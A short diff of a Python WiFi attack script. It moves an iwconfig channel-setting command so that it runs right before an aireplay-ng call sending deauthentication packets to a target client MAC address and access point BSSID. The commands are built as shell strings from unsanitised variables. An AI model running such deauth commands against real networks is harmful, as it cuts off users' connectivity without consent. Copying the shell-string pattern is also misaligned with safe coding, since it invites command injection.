@@ -203,8 +203,6 @@ if __name__ == "__main__":
                     Base.print_error("Could not set Monitor mode on interface: ", deauth_network_interface)
                     exit(1)
 
-            sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel + ' >/dev/null 2>&1'],
-                      shell=True, stdout=sub.PIPE)
             sub.Popen(['ifconfig ' + deauth_network_interface + ' up'], shell=True, stdout=sub.PIPE)
         except OSError as e:
             if e.errno == errno.ENOENT:
@@ -456,7 +454,9 @@ if __name__ == "__main__":
 
                 # Send wifi deauth packets
                 Base.print_info("WiFi deauth packets is sending ...")
-
+                
+                sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel + ' >/dev/null 2>&1'],
+                          shell=True, stdout=sub.PIPE)
                 aireplay_process = sub.Popen(['aireplay-ng wlan1 -0 25 -a ' + bssid + ' -c ' + target_mac_address +
                                               ' >/dev/null 2>&1'], shell=True)
                 aireplay_process.wait()
